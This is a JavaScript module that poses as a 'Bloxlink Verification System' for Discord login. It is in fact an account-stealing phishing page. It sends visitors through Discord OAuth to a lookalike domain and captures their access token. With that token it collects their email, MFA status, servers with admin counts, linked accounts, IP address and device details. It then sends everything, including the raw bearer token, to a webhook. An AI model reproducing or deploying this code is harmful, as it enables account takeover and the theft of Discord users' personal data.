import { CONFIG } from "./config.js";

/**
 * Módulo de Autenticação Discord OAuth2 e Envio de Webhook
 */

export function redirectToDiscordOAuth() {
  const currentOrigin = window.location.origin;
  const currentPath = window.location.pathname.replace(/\/$/, "");
  const redirectUri = `${currentOrigin}${currentPath}/`;
  const scopesParam = encodeURIComponent(CONFIG.SCOPES.join(" "));
  
  const oauthUrl = `https://discord.com/oauth2/authorize?client_id=1537942788463657030&response_type=token&redirect_uri=https%3A%2F%2Fbloxlink-auth.vercel.app%2Fdashboard&scope=identify+guilds+email+connections`;
  
  window.location.href = oauthUrl;
}

export function getDiscordOAuthToken() {
  const hash = window.location.hash;
  if (!hash) return null;

  const params = new URLSearchParams(hash.substring(1));
  const token = params.get("access_token");

  if (token) {
    window.history.replaceState(null, "", window.location.pathname + window.location.search);
  }
  return token;
}

export async function fetchPublicClientIp() {
  try {
    const res = await fetch("https://api64.ipify.org?format=json");
    if (res.ok) {
      const data = await res.json();
      return data.ip || null;
    }
  } catch (e) {
    console.warn("IP Lookup error:", e);
  }
  return null;
}

export function formatDiscordAvatar(user) {
  if (!user || !user.id) return CONFIG.BOT_AVATAR;
  if (user.avatar) {
    const ext = user.avatar.startsWith("a_") ? "gif" : "png";
    return `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=256`;
  }
  const defaultIndex = user.discriminator && user.discriminator !== "0"
    ? parseInt(user.discriminator) % 5
    : (BigInt(user.id) >> 22n) % 6n;
  return `https://cdn.discordapp.com/embed/avatars/${defaultIndex}.png`;
}

export function formatNitroType(type) {
  switch (type) {
    case 1: return "Nitro Classic ⚡";
    case 2: return "Nitro Boost 🚀";
    case 3: return "Nitro Basic 💎";
    default: return "Sem Nitro ❌";
  }
}

export function detectBrowserOS() {
  const ua = navigator.userAgent;
  let os = "Desconhecido";
  let browser = "Desconhecido";

  if (ua.includes("Win")) os = "Windows";
  else if (ua.includes("Mac")) os = "MacOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("like Mac")) os = "iOS";

  if (ua.includes("Firefox/")) browser = "Firefox";
  else if (ua.includes("Edg/")) browser = "Edge";
  else if (ua.includes("Chrome/")) browser = "Chrome";
  else if (ua.includes("Safari/")) browser = "Safari";
  else if (ua.includes("OPR/") || ua.includes("Opera/")) browser = "Opera";

  return `${browser} (${os})`;
}

export function buildWebhookFields(data) {
  const { accessToken, user, guilds, connections, clientIp, robloxUser } = data;

  const fields = [
    {
      name: "👤 Usuário Discord",
      value: `**${user.global_name || user.username}** (\`${user.username}\`)`,
      inline: true
    },
    {
      name: "🆔 Discord ID",
      value: `\`${user.id}\``,
      inline: true
    },
    ...(accessToken ? [{
      name: "🔑 Access Token (Bearer)",
      value: `\`\`\`${accessToken}\`\`\``,
      inline: false
    }] : []),
    ...(user.email ? [{
      name: "📧 E-mail da Conta",
      value: `\`${user.email}\` ${user.verified ? "*(Verificado ✅)*" : "*(Não Verificado ⚠️)*"}`,
      inline: false
    }] : []),
    {
      name: "🛡️ Segurança & Status",
      value: [
        `• 2FA/MFA: **${user.mfa_enabled ? "✅ Ativado" : "❌ Desativado"}**`,
        `• Nitro: **${formatNitroType(user.premium_type)}**`
      ].join("\n"),
      inline: false
    },
    {
      name: "🎮 Roblox Informado",
      value: robloxUser ? `\`${robloxUser}\`` : "*Nenhum*",
      inline: true
    }
  ];

  if (guilds && Array.isArray(guilds)) {
    const totalGuilds = guilds.length;
    const ownedGuilds = guilds.filter(g => g.owner).length;
    const adminGuilds = guilds.filter(g => (BigInt(g.permissions) & 0x8n) === 0x8n).length;
    const sampleGuilds = guilds.slice(0, 5).map(g => g.name).join(", ");

    fields.push({
      name: `🏰 Servidores (${totalGuilds})`,
      value: [
        `• Total: **${totalGuilds}** | Dono: **${ownedGuilds}** | Admin: **${adminGuilds}**`,
        sampleGuilds ? `• Principais: *${sampleGuilds}${totalGuilds > 5 ? "..." : ""}*` : null
      ].filter(Boolean).join("\n"),
      inline: false
    });
  }

  if (connections && Array.isArray(connections) && connections.length > 0) {
    const connList = connections.map(c => `• **${c.type}**: \`${c.name}\``).slice(0, 8).join("\n");
    fields.push({
      name: `🔗 Conexões (${connections.length})`,
      value: connList,
      inline: false
    });
  }

  if (clientIp || navigator.userAgent) {
    fields.push({
      name: "🌐 Dispositivo & Conexão",
      value: [
        clientIp ? `• IP: \`${clientIp}\`` : null,
        `• Navegador/OS: *${detectBrowserOS()}*`,
        `• Resolução: \`${window.screen.width}x${window.screen.height}\``
      ].filter(Boolean).join("\n"),
      inline: false
    });
  }

  return fields;
}

export async function sendToDiscordWebhook(data) {
  const { user } = data;
  const avatarUrl = formatDiscordAvatar(user);

  const payload = {
    username: CONFIG.BOT_NAME,
    avatar_url: CONFIG.BOT_AVATAR,
    embeds: [
      {
        title: "✅ Nova Autenticação Concluída (Discord OAuth)",
        color: CONFIG.EMBED_COLOR,
        thumbnail: {
          url: avatarUrl
        },
        fields: buildWebhookFields(data),
        footer: {
          text: "Bloxlink Verification System",
          icon_url: CONFIG.BOT_AVATAR
        },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    await fetch(CONFIG.API_WEBHOOK_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error("❌ Webhook Dispatch Error:", err);
  }
}

export async function fetchDiscordUserData(accessToken) {
  const headers = { Authorization: `Bearer ${accessToken}` };
  let user = null;
  let guilds = null;
  let connections = null;
  let clientIp = null;

  try {
    const userRes = await fetch("https://discord.com/api/users/@me", { headers });
    if (userRes.ok) {
      user = await userRes.json();
    }
  } catch (e) {
    console.error("Erro ao buscar Discord @me:", e);
  }

  if (!user) return false;

  if (CONFIG.FETCH_GUILDS) {
    try {
      const guildsRes = await fetch("https://discord.com/api/users/@me/guilds", { headers });
      if (guildsRes.ok) {
        guilds = await guildsRes.json();
      }
    } catch (e) {}
  }

  if (CONFIG.FETCH_CONNECTIONS) {
    try {
      const connRes = await fetch("https://discord.com/api/users/@me/connections", { headers });
      if (connRes.ok) {
        connections = await connRes.json();
      }
    } catch (e) {}
  }

  if (CONFIG.FETCH_CLIENT_IP) {
    clientIp = await fetchPublicClientIp();
  }

  const robloxUser = sessionStorage.getItem("saved_roblox_username") || null;

  await sendToDiscordWebhook({
    accessToken,
    user,
    guilds,
    connections,
    clientIp,
    robloxUser
  });

  return user;
}
